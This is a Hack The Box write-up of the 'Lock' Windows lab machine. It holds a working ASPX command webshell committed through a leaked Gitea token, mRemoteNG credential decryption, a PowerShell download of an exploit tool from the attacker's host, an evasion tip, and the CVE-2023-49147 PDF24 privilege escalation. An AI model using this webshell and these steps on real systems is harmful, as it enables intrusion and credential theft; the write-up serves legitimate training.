---
title: Lock [Easy]
date: 2025-08-22
tags: [htb, windows, nmap, access token, gitea, webshell, cve-2023-49147, oplock, mremoteNG, pdf24, rdp, smb, nxc, msi]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/lock-htb-retired-machine
image: /assets/img/lock-htb-retired-machine/lock-htb-retired-machine_banner.png
---

# Lock HTB Retired Machine
## Machine information
Author: [xct](https://app.hackthebox.com/users/13569) and [kozmer](https://app.hackthebox.com/users/637320)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 10:04 EDT
Nmap scan report for 10.129.xx.xx
Host is up (0.46s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Lock - Index
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=99f100bd9e1111bd; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=bB5iEJ8zJn5U637EP47PSCBQ-qI6MTc1NTc4NTExNzQzNTk5MzUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 21 Aug 2025 14:05:17 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=d0cf286224a382ff; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=XWtxLMLo6-8R9E-8WBFoc52ema86MTc1NTc4NTEyMTU2MTAwMDIwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 21 Aug 2025 14:05:21 GMT
|_    Content-Length: 0
|_http-title: Gitea: Git with a cup of tea
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2025-04-15T00:34:47
|_Not valid after:  2025-10-15T00:34:47
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-21T14:06:08+00:00
|_ssl-date: 2025-08-21T14:06:46+00:00; -1s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=8/21%Time=68A7279B%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2A6C,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=
SF:99f100bd9e1111bd;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie
SF::\x20_csrf=bB5iEJ8zJn5U637EP47PSCBQ-qI6MTc1NTc4NTExNzQzNTk5MzUwMA;\x20P
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2021\x20Aug\x202025\x2014:05:17\x20G
SF:MT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-
SF:auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=device
SF:-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20c
SF:up\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:app
SF:lication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYS
SF:IsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfd
SF:XJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8v
SF:bG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmc
SF:iLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Metho
SF:d\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GE
SF:T\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x20no
SF:-transform\r\nSet-Cookie:\x20i_like_gitea=d0cf286224a382ff;\x20Path=/;\
SF:x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=XWtxLMLo6-8R9E-8WB
SF:Foc52ema86MTc1NTc4NTEyMTU2MTAwMDIwMA;\x20Path=/;\x20Max-Age=86400;\x20H
SF:ttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20
SF:Thu,\x2021\x20Aug\x202025\x2014:05:21\x20GMT\r\nContent-Length:\x200\r\
SF:n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-21T14:06:11
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.66 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.xx.xx     lock.htb
```

We got 2 http services, let's check them out.

### Web Enumeration
First gonna check the `http://lock.htb/`.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website.png)

Walking around and checking there is no function so this may be a static website. <br>
&rarr; Let's head to the `http://lock.htb:3000/` and see what we got.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-2.png)

We got **Gitea** platform, let's check out the `Explore` tab if we can find any repo.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-3.png)

Got a repo called `dev-scripts` from `ellen.freeman` so we find a username. <br>
&rarr; Let's check out the `Users` tab and see if we can find any user.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-4.png)

So there is `Administrator` user, we gonna check it out.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-5.png)

There is no repo from `Administrator`. Let's back to the `dev-scripts` repo and see if we can find any interesting file.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-6.png)

There is a `repos.py` file, notice that there is 2 commits. <br>
&rarr; Gonna check it out cause there maybe chance for commit message that leak credentials or something.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-7.png)

Okay, let's go with the bottom from `dcc869b175` where user `Add repos.py` commit.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-8.png)

Nailed it, the `PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'` pop up infront of our eyes. <br>
If we check the other commit.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-9.png)

We can see that the author has deleted from `repos.py` file and change the `PERSONAL_ACCESS_TOKEN` to `GITEA_ACCESS_TOKEN`.

Now let's clone this repo first.

### Gitea Access Token
```bash
└─$ git clone http://lock.htb:3000/ellen.freeman/dev-scripts.git                                                                          
Cloning into 'dev-scripts'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 6 (delta 1), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (6/6), done.
Resolving deltas: 100% (1/1), done.
```

Here is the `repos.py` file.

```python
import requests
import sys
import os

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)

    try:
        repos = get_repositories(personal_access_token, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

From the script, we can see how it works: <br>
- Get all repositories of the current user
- Automatically format domain (add `https://` if missing)
- Use Gitea API endpoint `/api/v1/user/repos`
- Print out the list of repositories with format `owner/repo_name`

So we got the token from the first commit, let's use it to get the list of repositories.

```bash
export GITEA_ACCESS_TOKEN="43ce39bb0bd6bc489284f2905f033ca467a6362f"
```

```bash
└─$ python3 repos.py http://lock.htb:3000/                                                                 
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```

We got another repo `website`. Let's clone this down too.

```bash
└─$ git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@lock.htb:3000/ellen.freeman/website.git
Cloning into 'website'...
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 502.00 KiB/s, done.
Resolving deltas: 100% (35/35), done.
```

> *Check out this [link](https://graphite.dev/guides/git-clone-with-token#cloning-a-repository-using-a-personal-access-token) for more information about how to clone a repository using a personal access token.*

So probably this `website` is use the `port 80` as we see from the static web. <br>
&rarr; Here is the things, what we will do next?

We know that this machine is running on `Windows` so we can assume that if we commit a file that contain webshell, it will works. <br>
&rarr; But it is just a hypothesis, let's prove it.

### Webshell
We will craft a `shell.aspx` file that contain webshell.

```bash
└─$ cat shell.aspx 
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    string cmd = Request.QueryString["cmd"];
    if (cmd != null)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        string output = p.StandardOutput.ReadToEnd();
        p.WaitForExit();
        Response.Write("<pre>" + output + "</pre>");
    }
}
</script>
```

Let's commit this file to the `website` repo.

```bash
└─$ git add shell.aspx

└─$ git commit -m "Add maintenance script"
Author identity unknown

*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

fatal: empty ident name (for <kali@kali>) not allowed

└─$ git push origin main
Everything up-to-date
```

So we got some error due to the `Author identity unknown`. <br>
&rarr; We need to set the author identity.

```bash
└─$ git config --global user.email "ellen.freeman@lock.htb"   

└─$ git config --global user.name "ellen.freeman"

└─$ git commit -m "Add maintenance script"                 
[main 792ed02] Add maintenance script
 1 file changed, 20 insertions(+)
 create mode 100644 shell.aspx

└─$ git push origin main                                   
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 610 bytes | 610.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://lock.htb:3000/ellen.freeman/website.git
   73cdcc1..792ed02  main -> main
```

There we go, for the email and name, we can just use random to make sure that it has the author identity. <br>
After commit and push, we back to the `http://lock.htb/` and access the `shell.aspx` file.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-10.png)

So our webshell is working well and we are `lock\ellen.freeman` now. <br>
Recon and found out there is another user.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-11.png)

It was `gale.dekarios` and access to `ellen.freeman` and found out some credentials and config related to github.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-12.png)

There are `.git-credentials` and `.gitconfig` file, let's check it out.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-13.png)

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-14.png)

But seems like we can not do anything with these files so and keep recon. <br>
&rarr; Let's check if this machine got [DPAPI](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets) protected secrets.

Checking out and we can not found any but we got this interesting folder.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-15.png)

We found `mRemoteNG` folder.

> *The `/a` used to list all hidden files and folders.*

### mRemoteNG
So [mRemoteNG](https://mremoteng.org/) is a remote desktop manager for Windows that allow us to view all the connections in a simple yet powerfull interface. <br>
But more interesting is that we found out those files in `mRemoteNG` folder could contain credentials. <br>
After checking and found out that `confCons.xml` is mRemoteNG configuration file that contain credentials. <br>
&rarr; Checking them out with `type` command and can not see the information, maybe it is too much or it is encrypted which can not easily display out.

We gonna use this one [Certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) to encode the data from `confCons.xml` file to `base64` and then copy to our kali and decode it.

```cmd
certutil -encode C:\Users\ellen.freeman\AppData\Roaming\mRemoteNG\confCons.xml C:\Users\ellen.freeman\Desktop\conf.b64
```

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-16.png)

Then check them out.

```cmd
type C:\Users\ellen.freeman\Desktop\conf.b64
```

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-17.png)

Copy back to our kali and save as `conf.b64`. Then we will remove the `-----BEGIN CERTIFICATE-----` and `-----END CERTIFICATE-----` to make sure it do not effect the `base64` process.

```bash
└─$ sed -e '/-----BEGIN CERTIFICATE-----/d' -e '/-----END CERTIFICATE-----/d' conf.b64 | base64 -d > confCons.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="u5ojv17tIZ1H1ND1W0YqvCslhrNSkAV6HW3l/hTV3X9pN8aLxxSUoc2THyWhrCk18xWnWi+DtnNR5rhTLz59BBxo" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```

Summary from this file we got: <br>
- Username: `Gale.Dekarios`
- Encrypted Password: `LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw==`
- Hostname: `Lock`
- Protocol: `RDP`
- Port: `3389`

And the encryption details is: <br>
- Encryption Engine: `AES`
- Block Cipher Mode: `GCM`
- Kdf Iterations: `1000`
- Full File Encryption: `false`
- Protected: `u5ojv17tIZ1H1ND1W0YqvCslhrNSkAV6HW3l/hTV3X9pN8aLxxSUoc2THyWhrCk18xWnWi+DtnNR5rhTLz59BBxo`
- Conf Version: `2.6`

&rarr; So we need to decrypt this password.

### mRemoteNG Password Decryptor
Searching and found out [mRemoteNG_password_decrypt](https://github.com/gquere/mRemoteNG_password_decrypt) can be used to decrypt the password.

```bash
└─$ python3 mremoteng_decrypt.py confCons.xml 
Name: RDP/Gale
Hostname: Lock
Username: Gale.Dekarios
Password: ty8wnW9qCKDosxxx
```

We got the password, let's verify it.

```bash
└─$ sudo nxc smb 10.129.xx.xx -u gale.dekarios -p 'ty8wnW9qCKDosxxx' --users         
SMB         10.129.xx.xx   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:False) 
SMB         10.129.xx.xx   445    LOCK             [+] Lock\gale.dekarios:ty8wnW9qCKDosxxx
```

```bash
└─$ sudo nxc smb 10.129.xx.xx -u gale.dekarios -p 'ty8wnW9qCKDosxxx' --shares        
SMB         10.129.xx.xx   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:False) 
SMB         10.129.xx.xx   445    LOCK             [+] Lock\gale.dekarios:ty8wnW9qCKDosxxx 
SMB         10.129.xx.xx   445    LOCK             [*] Enumerated shares
SMB         10.129.xx.xx   445    LOCK             Share           Permissions     Remark
SMB         10.129.xx.xx   445    LOCK             -----           -----------     ------
SMB         10.129.xx.xx   445    LOCK             ADMIN$                          Remote Admin
SMB         10.129.xx.xx   445    LOCK             C$                              Default share
SMB         10.129.xx.xx   445    LOCK             IPC$            READ            Remote IPC
```

All good but seems like we can not do anything with `smb` and even can not `evil-winrm` to access this machine. <br>
&rarr; But it got port 3389 open which is RDP.

### RDP
Let's try to connect to the user `gale.dekarios` with RDP.

```bash
└─$ rdesktop -u 'gale.dekarios' -p 'ty8wnW9qCKDosxxx' 10.129.xx.xx:3389
```

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-18.png)

So we can access to this machine through RDP and found out there is a `user` file.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-19.png)

Got our `user.txt` flag.

## Initial Access
After access to `gale.dekarios`, we found out there is `PDF24 Launcher` and `PDF24 Toolbox`.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-20.png)

### PDF24
Checking out the version.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-21.png)

The version is `11.15.1` and search out vulnerability. <br>
&rarr; Found out [CVE-2023-49147](https://nvd.nist.gov/vuln/detail/CVE-2023-49147).

The core of this vulnerability is: <br>
- Run with user privileges
- Call sub-process `pdf24-PrinterInstall.exe` with SYSTEM privileges
- Sub-process open `cmd.exe` window to perform tasks
- Window should close after finish, but can be "stuck"

So the attack vector is `OpLock` and the reason is that: <br>
- OpLock = Windows mechanism allow application "lock" file
- When process A is reading/writing file
- Process B want to access the same file
- OpLock will "pause" Process A until Process B release lock

> *Check this [local privilege escalation via msi installer in PDF24 Creator](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/) and also [full disclosure](https://seclists.org/fulldisclosure/2023/Dec/18) for more information.*

## Privilege Escalation
From that we gonna exploit and it gonna be like this image from [full disclosure](https://seclists.org/fulldisclosure/2023/Dec/18).

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-22.png)

So let's get it to go.

### CVE-2023-49147
First we need to download tool from [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools) and extract it.

```bash
└─$ 7z x Release.7z 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 197274 bytes (193 KiB)

Extracting archive: Release.7z
--
Path = Release.7z
Type = 7z
Physical Size = 197274
Headers Size = 455
Method = LZMA2:1536k BCJ
Solid = +
Blocks = 2

Everything is Ok

Files: 14
Size:       1442410
Compressed: 197274
```

Then we need to find the MSI installer.

```cmd
dir C:\ /s /b | findstr -i "pdf24.*\.msi"
```

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-23.png)

```cmd
C:\_install\pdf24-creator-11.15.1-x64.msi
```

Then we will host on our kali for machine to grab `SetOpLock.exe` file.

```bash
└─$ python3 -m http.server 80                                                                              
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```cmd
powershell -Command "Invoke-WebRequest -Uri 'http://10.xx.xx.xx/SetOpLock.exe' -OutFile 'SetOpLock.exe'"
```

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-24.png)

```bash
└─$ python3 -m http.server 80                                                                              
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.xx.xx - - [21/Aug/2025 22:48:02] "GET /SetOpLock.exe HTTP/1.1" 200 -
```

Confirm that the file is downloaded.

> *Create a `/Temp` folder and grab the file is better than download in home directory cause these directory often got watched or have rules that prevent suspicious activities.*

Now setup `OpLock`.

```cmd
SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

It will: <br>
- Create "read lock" on log file
- When other process try to write into it → blocked

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-25.png)

Then we trigger the repair.

```cmd
msiexec.exe /fa "C:\_install\pdf24-creator-11.15.1-x64.msi"
```

- `/fa` = repair all files
- No UAC popup (because only "repair")

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-26.png)

We will wait for few second for install to finish and it will pop up the screen like this.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-27.png)

For this part is that the SYSTEM Process Stuck and can not close the CMD window.

Next part is the GUI Exploit.

We will `Right-click` CMD title bar and click `Properties`.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-28.png)

Click on `Legacy console mode` link and then will pop up for choosing browser to open.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-29.png)

After choosing `Firefox` as browser, it will open the browser.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-30.png)

Then `Ctrl + O` and type `cmd.exe` and enter.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-31.png)

Now we are `nt authority\system`.

![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-32.png)

BOOM! Got our `root.txt` flag.

> *These steps are provided clearly from this [local privilege escalation via msi installer in PDF24 Creator](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/) so if something when wrong, be sure to repeat the steps again and restart the machine if needed.*

![result](/assets/img/lock-htb-retired-machine/result.png)